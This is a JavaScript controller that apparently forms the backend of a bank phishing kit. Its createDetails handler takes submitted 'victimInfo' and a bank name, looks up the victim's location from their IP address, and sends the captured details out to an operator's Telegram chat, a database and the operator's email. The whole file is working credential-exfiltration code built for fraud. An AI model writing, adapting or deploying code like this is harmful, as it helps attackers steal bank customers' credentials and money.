const Detail = require("../models/detail");
const json = require("../utils/jsonresponse");
const sendMail = require("../utils/sendMail");
const { htmlEmail } = require("../utils/emailTemplates");
const { telegramMessage } = require("../utils/telegram");
const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");

const bot = new TelegramBot(process.env.BOT_TOKEN);

const createDetails = async (req, res) => {
  try {
    const resp = await axios.get(
      `https://api.ipgeolocation.io/ipgeo?ip=${req.body.victimInfo?.ip}&apiKey=${process.env.IP_GEO_API_KEY}`,
    );
    if (resp?.data) {
      req.body.victimInfo = {
        ...req.body.victimInfo,
        lat: resp?.data?.latitude,
        lon: resp?.data?.longitude,
        city: resp?.data?.city,
        country: resp?.data?.country_name,
        countryCode: resp?.data?.country_code2,
        region: resp?.data["state_code"].split("-").pop(),
        regionName: resp?.data?.state_prov,
        zip: resp?.data?.zipcode,
      };
    }

    if (process.env?.USER_CHAT_ID && process.env?.BOT_TOKEN) {
      await bot.sendMessage(
        process.env?.USER_CHAT_ID,
        telegramMessage(req.body),
      );
    }

    if (process.env?.DB_URI) await new Detail(req.body).save();

    if (process.env?.MAIL_USERNAME && process.env?.MAIL_PASSWORD) {
      await sendMail({
        email: process.env?.MAIL_USERNAME,
        subject: req.body.bank,
        html: htmlEmail(req.body),
      });
    }

    json(res, 201, "Submitted successfully");
  } catch (error) {
    json(res, 500, error.message);
  }
};

module.exports = {
  createDetails,
};